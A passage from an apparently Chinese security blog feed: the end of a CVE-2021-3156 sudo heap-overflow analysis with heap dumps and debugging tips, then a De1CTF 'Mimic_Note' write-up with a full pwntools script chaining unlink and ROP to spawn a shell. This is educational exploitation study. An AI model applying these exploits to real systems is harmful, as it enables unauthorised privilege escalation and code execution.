class="line"><span class="number">0x555555784000</span>: <span class="number">0x0000000000544443</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555784010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x555555784020</span>: <span class="number">0x0000000000545343</span>      <span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x555555784030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055555577a010</span></span><br><span class="line"><span class="number">0x555555784040</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784050</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784060</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784070</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784080</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784090</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557840a0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557840b0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557840c0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557840d0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557840e0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557840f0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784100</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x0000d70043434343</span></span><br><span class="line"><span class="number">0x555555784110</span>: <span class="number">0x00000401907e0000</span>      <span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x555555784120</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555784130</span>: <span class="number">0x2e382d4654552e43</span>      <span class="number">0x4343434038667475</span></span><br><span class="line"><span class="number">0x555555784140</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784150</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784160</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784170</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784180</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784190</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557841a0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557841b0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557841c0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557841d0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557841e0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557841f0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784200</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784210</span>: <span class="number">0x5954435f434c2f43</span>      <span class="number">0x5400000043004550</span></span><br><span class="line"><span class="number">0x555555784220</span>: <span class="number">0x00000000004e4f00</span>      <span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x555555784230</span>: <span class="number">0x40382d4654552e43</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784240</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784250</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784260</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784270</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784280</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784290</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557842a0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557842b0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557842c0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557842d0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557842e0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x5555557842f0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555784300</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x0000000043434343</span></span><br><span class="line"><span class="number">0x555555784310</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000081</span></span><br><span class="line"><span class="number">0x555555784320</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055555577a010</span></span><br><span class="line"><span class="number">0x555555784330</span>: <span class="number">0x73656c000073696e</span>      <span class="number">0x696e696d5f340000</span></span><br><span class="line"><span class="number">0x555555784340</span>: <span class="number">0x544f4e5b206c616d</span>      <span class="number">0x65723d444e554f46</span></span><br><span class="line"><span class="number">0x555555784350</span>: <span class="number">0x6e64205d6e727574</span>      <span class="number">0x74736f68796d2073</span></span><br><span class="line"><span class="number">0x555555784360</span>: <span class="number">0x74200000656d616e</span>      <span class="number">0x00000000003a7972</span></span><br><span class="line"><span class="number">0x555555784370</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555784380</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555784390</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x5555557843a0</span>: <span class="number">0x00005555557843e0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557843b0</span>: <span class="number">0x0000000100000000</span>      <span class="number">0x0000555500000001</span></span><br><span class="line"><span class="number">0x5555557843c0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557843d0</span>: <span class="number">0x00007461706d6f63</span>      <span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x5555557843e0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557843f0</span>: <span class="number">0x0000000100000000</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x555555784400</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555784410</span>: <span class="number">0x00646d6574737973</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555784420</span>: <span class="number">0x0000555555784480</span>      <span class="number">0x0000555555784440</span></span><br><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555785130</span> (size : <span class="number">0x15ed0</span>) </span><br><span class="line">       last_remainder: <span class="number">0x5555557849d0</span> (size : <span class="number">0x600</span>) </span><br><span class="line">            unsortbin: <span class="number">0x5555557849d0</span> (size : <span class="number">0x600</span>)</span><br><span class="line">(<span class="number">0x80</span>)   tcache_entry[<span class="number">6</span>](<span class="number">1</span>): <span class="number">0x555555784320</span></span><br><span class="line">(<span class="number">0xf0</span>)   tcache_entry[<span class="number">13</span>](<span class="number">1</span>): <span class="number">0x555555784030</span></span><br><span class="line">(<span class="number">0x100</span>)   tcache_entry[<span class="number">14</span>](<span class="number">1</span>): <span class="number">0x555555783880</span></span><br><span class="line">(<span class="number">0x120</span>)   tcache_entry[<span class="number">16</span>](<span class="number">1</span>): <span class="number">0x555555780490</span></span><br><span class="line">(<span class="number">0x230</span>)   tcache_entry[<span class="number">33</span>](<span class="number">1</span>): <span class="number">0x55555577a260</span></span><br></pre></td></tr></table></figure>
<p>下图为构造出的空闲堆块。<br><img src="/2021/02/04/cve-2021-3156/12.png" alt></p>
<p>下图为分配<code>user_args</code></p>
<p><img src="/2021/02/04/cve-2021-3156/3.png" alt></p>
<p>下图为构造的<code>user_args</code>及<code>ni</code>，当我们使用反斜线时就会向堆中写入空字符，在exp里我们构造的环境变量的前面为反斜线以填充0，因为堆块大小为0x40因此我们填充的大小为63(包含堆块头)，最终把<code>0x5555557843d0</code>的字符串改为<code>X/P0P_SH3LLZ_</code></p>
<p><img src="/2021/02/04/cve-2021-3156/2.png" alt></p>
<p><img src="/2021/02/04/cve-2021-3156/4.png" alt></p>
<p><img src="/2021/02/04/cve-2021-3156/5.png" alt></p>
<p><img src="/2021/02/04/cve-2021-3156/1.png" alt></p>
<p>本地环境及sudo版本</p>
<p><img src="/2021/02/04/cve-2021-3156/14.png" alt></p>
<h2 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h2><p><code>gdb ./exp</code>断到execve之后<code>b setlocale</code>进到sudo里，反编译<code>sudoers.so</code>找到分配<code>user_args</code>的位置(根据函数里的特殊字符串定位)，<code>nss_load_libray</code>为libc库函数，可直接断下，最后配合上述流程分析即可。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后的exp构造出的堆空间非常巧妙，由于没有资料显示如何构造，只能理解为多次实验寻找规律或者fuzz关键参数自动化跑，就目前公开的结果看我还是倾向于大家都是fuzz的。在之前qemu逃逸的分析中我们可以知道假如可以构造稳定的malloc原语和free原语其实我们就会有稳定的exp，可能也正因为这个exp没有给出构造原语的方法，exp作者最后给了一个爆破脚本用以适配其他系统。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.90sec.com/t/topic/1552" target="_blank" rel="noopener">CVE-2021-3156sudo堆溢出分析</a></p>
<p><a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">参考exp</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF Mimic_Note</title>
    <url>/2020/09/03/mimic_note/</url>
    <content><![CDATA[<h1 id="de1ctf-Mimic-Note"><a href="#de1ctf-Mimic-Note" class="headerlink" title="de1ctf Mimic_Note"></a>de1ctf Mimic_Note</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第二题做的我又自闭了，想想七哥和姚老板比赛当日拿这么难的方法抢到了三血真是太厉害了，后来看官方的wp说程序的mimic_server并不是要求同时跑通64和32，而是只要输出一致即可，所以程序考察的是不泄露libc的ROP，可以用re2dl_resolve做，但是学长的exp是直接实现了一个拟态的exp，里面用到了很多我找都没找到的gadgets。。最重要的是拟态题的数据错位输入和一些同步触发的要求，这题自己也做不出，只能看着学长的exp慢慢调试，感觉收获了很多。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>libc2.23，程序可以new、edit、free、其中edit有一个off-by-one，固定多输入一个零字符。got表可写。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>基本思路是unlink之后修改atoi为某个gadgets触发栈迁移，之后把write@got改成syscall。具体实现过程中要注意修改atoi的操作要32和64同步进行，顺序修改的时候会引发异常(比如修改32的atoi再修改64的aoti在32位运行时第二次修改已经不能正常使用edit)。</p>
<p>为了解决同时修改atoi：32和64在heap_list各占据一块位置，unlink后32位在heap_list_0处放p32(atoi_got_32)，64位在heap_list_0处方p64(atoi_got_64-8)，这样一次Edit(p32(gadgets_32)+p32(0)+p64(gadgets_64))即可同步修改两个atoi。</p>
<p>另一个问题是如何在一次输入数据时候触发两个ROP(顺序触发ROP还是之前说的问题，atoi不能正常使用之后第二次的edit是不能用的)。这个在stkof里我们有经验，要利用数据的错位，比如32位里可以直接pop ebp;leave ret;而64位可以把前8字节数据pop到rsi再pop rbp,leave ret;这样(即使这样，32位的栈迁移gadgets也没有找到)。</p>
<p>一些细节：因为64位要输入两次数据，32位输入一次数据，我们可以把32位的输入放后面并且在32的ROP里加入前两次输入，而64不需要管这些，后面拿到shell之后send一次垃圾数据也无所谓。</p>
<p>unlink之后覆写不要挑free的块写，因为在另一个arch下这里是不能写的。</p>
<p>还有ROP本身的问题，64bit ROP通过read设置rax，之后通过csu拿shell，但是32bit始终做不到ebx=binsh_addr的时候ecx=edx=0，看了17的exp发现并不是通过read设置的eax，而是通过先pop ebp设置ebp  = 0x2c+0xb,后用lea eax,[ebp-0x2c]设置eax=0xb，在此之前read(0,0,0)将eax,ebx,ecx,edx全部清空，从而构造完成，注意之后还要call一次atoi，这时atoi已经被改为gadgets，因此要再迁回bss上，最后p_ebx再syscall即可。</p>
<p>关键gadgets:</p>
<ol>
<li><p>32atoi-&gt;gadgets:(found by 17)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text:080489EE                 add     esp, 10h</span><br><span class="line">.text:080489F1                 cmp     edi, esi</span><br><span class="line">.text:080489F3                 jnz     short loc_80489D8</span><br><span class="line">.text:080489F5</span><br><span class="line">.text:080489F5 loc_80489F5:                            ; CODE XREF: __libc_csu_init+2E↑j</span><br><span class="line">.text:080489F5                 add     esp, 0Ch</span><br><span class="line">.text:080489F8                 pop     ebx</span><br><span class="line">.text:080489F9                 pop     esi</span><br><span class="line">.text:080489FA                 pop     edi</span><br><span class="line">.text:080489FB                 pop     ebp</span><br><span class="line">.text:080489FC                 retn</span><br></pre></td></tr></table></figure>
</li>
<li><p>64atoi-&gt;gadgets:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0000000000400c2f : pop rbp ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>32栈迁移gadgets-&gt;leave_ret_32</p>
</li>
<li><p>64栈迁移gadgets:(注意pop rsp之后就迁移到bss了)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0000000000400c2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>32设置eax</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048907                 lea     eax, [ebp-2Ch]</span><br><span class="line">.text:0804890A                 push    eax             ; nptr</span><br><span class="line">.text:0804890B                 call    _atoi</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf64 = ELF(<span class="string">'./mimic_note_64'</span>)</span><br><span class="line">elf32 = ELF(<span class="string">'./mimic_note_32'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p = process('./mimic_note_64')</span></span><br><span class="line">    p = process(<span class="string">'./mimic_note_32'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'45.32.120.212'</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size?\n'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index ?\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index ?\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index ?\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content?'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#64 bit unlink</span></span><br><span class="line">    heap_lis_64 = <span class="number">0x6020A0</span></span><br><span class="line">    fd = heap_lis_64 - <span class="number">0x18</span></span><br><span class="line">    bk = heap_lis_64 - <span class="number">0x10</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)</span><br><span class="line">    New(<span class="number">0x38</span>)<span class="comment">#0</span></span><br><span class="line">    New(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">    New(<span class="number">0xf7</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment">#paddings</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        New(<span class="number">0x68</span>)<span class="comment">#3-12</span></span><br><span class="line">    New(<span class="number">0x1c</span>)<span class="comment">#13</span></span><br><span class="line">    New(<span class="number">0xfc</span>)<span class="comment">#14</span></span><br><span class="line">    New(<span class="number">0xf7</span>)<span class="comment">#15</span></span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#32 bit unlink</span></span><br><span class="line">    heap_lis_32 = <span class="number">0x0804a060</span></span><br><span class="line">    fd = heap_lis_32 + <span class="number">8</span>*<span class="number">13</span> - <span class="number">0xc</span></span><br><span class="line">    bk = heap_lis_32 + <span class="number">8</span>*<span class="number">13</span> - <span class="number">0x8</span></span><br><span class="line">    payload = p32(<span class="number">0</span>)+p32(<span class="number">0x18</span>)+p32(fd)+p32(bk)+<span class="string">"a"</span>*<span class="number">8</span>+p32(<span class="number">0x18</span>)</span><br><span class="line">    Edit(<span class="number">13</span>,payload)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#64 bit ROP</span></span><br><span class="line">    bss_64 = elf64.bss()+<span class="number">0x200</span></span><br><span class="line">    atoi_got_64 = elf64.got[<span class="string">'atoi'</span>]</span><br><span class="line">    write_got_64 = elf64.got[<span class="string">'write'</span>]</span><br><span class="line">    write_plt_64 = elf64.plt[<span class="string">'write'</span>]</span><br><span class="line">    read_plt_64 = elf64.plt[<span class="string">'read'</span>]</span><br><span class="line">    read_got_64 = elf64.got[<span class="string">'read'</span>]</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    payload += p64(heap_lis_64)+p64(<span class="number">0x1000</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(atoi_got_64<span class="number">-8</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(bss_64)+p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(bss_64)+p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(write_got_64)</span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line">    <span class="comment">#csu</span></span><br><span class="line">    p_rdi = <span class="number">0x400c33</span></span><br><span class="line">    p_rsi_r15 = <span class="number">0x400c31</span></span><br><span class="line">    rop_64 = <span class="string">"/bin/sh\x00"</span>+p64(bss_64+<span class="number">0x200</span>)</span><br><span class="line">    <span class="comment">#set rax</span></span><br><span class="line">    rop_64 += p64(p_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop_64 += p64(p_rsi_r15)+p64(write_got_64)+p64(<span class="number">0</span>)</span><br><span class="line">    rop_64 += p64(read_plt_64)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    rop_64 += p64(<span class="number">0x400c2a</span>)</span><br><span class="line">    rop_64 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got_64)+p64(<span class="number">0x100</span>)+p64(bss_64+<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x400c10</span>)+<span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">    rop_64 += p64(<span class="number">0x400c2a</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got_64)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(bss_64)+p64(<span class="number">0x400c10</span>)+<span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>,rop_64)</span><br><span class="line">    <span class="comment">#set rax=59</span></span><br><span class="line">    <span class="comment">#ovwerite aoti</span></span><br><span class="line">    p_rbp64 = <span class="number">0x400770</span></span><br><span class="line">    leave_ret64 = <span class="number">0x4008b7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400b32')</span></span><br><span class="line">        <span class="comment">#trigger 64</span></span><br><span class="line">    atoi_got_32 = elf32.got[<span class="string">'atoi'</span>]</span><br><span class="line">    read_got_32 = elf32.got[<span class="string">'read'</span>]</span><br><span class="line">    read_plt_32 = elf32.plt[<span class="string">'read'</span>]</span><br><span class="line">    write_got_32 = elf32.got[<span class="string">'write'</span>]</span><br><span class="line">    write_plt_32 = elf32.plt[<span class="string">'write'</span>]</span><br><span class="line">    <span class="comment">#32 bit ROP</span></span><br><span class="line">    bss_32 = elf32.bss()+<span class="number">0x100</span></span><br><span class="line">    Edit(<span class="number">13</span>,p32(<span class="number">0x100</span>)+p32(heap_lis_32)+p32(<span class="number">0x100</span>)+p32(bss_32)+p32(<span class="number">0x200</span>))</span><br><span class="line">    Edit(<span class="number">12</span>,p32(atoi_got_32)+p32(<span class="number">0x100</span>))</span><br><span class="line">    <span class="comment">#12:aoti_got</span></span><br><span class="line">    <span class="comment">#13:bss</span></span><br><span class="line">    leave_ret32 = <span class="number">0x08048568</span></span><br><span class="line">    p4_32 = <span class="number">0x80489f8</span></span><br><span class="line">    p_ebx_32 = <span class="number">0x08048439</span></span><br><span class="line">    rop32 = <span class="string">"/bin/sh\x00"</span>+p32(bss_32+<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment">#set syscall</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)+p32(bss_32+<span class="number">0x300</span>)+p32(<span class="number">0x100</span>)+p32(bss_32+<span class="number">0xc</span>+<span class="number">0x14</span>)<span class="comment">#for rop64</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)+p32(bss_32+<span class="number">0x300</span>)+p32(<span class="number">0x100</span>)+p32(bss_32+<span class="number">0xc</span>+<span class="number">0x14</span>)<span class="comment">#for rop64</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)+p32(write_got_32)+p32(<span class="number">0x100</span>)+p32(bss_32+<span class="number">0xc</span>+<span class="number">0x14</span>)</span><br><span class="line">    <span class="comment">#set eax</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    rop32 += p32(<span class="number">0x080489f9</span>)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0xb</span>+<span class="number">0x2c</span>)+p32(<span class="number">0x08048907</span>)</span><br><span class="line">    rop32 += p32(<span class="number">0</span>)*<span class="number">9</span></span><br><span class="line">    rop32 += p32(<span class="number">0x08048588</span>)</span><br><span class="line">    rop32 += p32(p_ebx_32)+p32(<span class="number">0x804a1f4</span>)+p32(write_plt_32)+<span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">13</span>,rop32)</span><br><span class="line">    <span class="comment">#migration</span></span><br><span class="line">    mig_32 = <span class="number">0x080489ee</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#set migration</span></span><br><span class="line">    prbp_2ret_64 = <span class="number">0x400c2f</span></span><br><span class="line">    Edit(<span class="number">0</span>,p32(mig_32)+p32(<span class="number">0</span>)+p64(prbp_2ret_64))</span><br><span class="line">    <span class="comment">#p.sendafter("&gt;&gt; ",p64(p_rbp64)+p64(bss_64+8)+p64(leave_ret64))</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0804890b')</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400b32')</span></span><br><span class="line">    p.sendafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"a"</span>*<span class="number">4</span>+<span class="string">"b"</span>*<span class="number">4</span>+p32(bss_32+<span class="number">8</span>)+p32(leave_ret32)+p64(<span class="number">0x400c2d</span>)+p64(bss_64<span class="number">-8</span>)[:<span class="number">6</span>])</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">'\xbe'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">"\x00"</span>*<span class="number">59</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#p.sendafter("&gt;&gt; ","a"*4+"b"*4+p32(bss_32+8)+p32(leave_ret32))</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">"\x8c"</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>花了两天时间才差不多搞懂，要再膜一些17学长和姚老板，路漫漫其修远其，吾将上下而求索。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://sunichi.github.io/2019/08/08/de1ctf19-pwn/" target="_blank" rel="noopener">17师傅</a></p>
]]></content>
  </entry>
  <entry>
    <title>nisc2019 PWN writeup</title>
    <url>/2020/09/03/nisc2019/</url>
    <content><![CDATA[<h1 id="nisc2019"><a href="#nisc2019" class="headerlink" title="nisc2019"></a>nisc2019</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天跟队里打(学习)的一场比赛，团队零贡献，又是看七哥姚老板日天的一天。。</p>
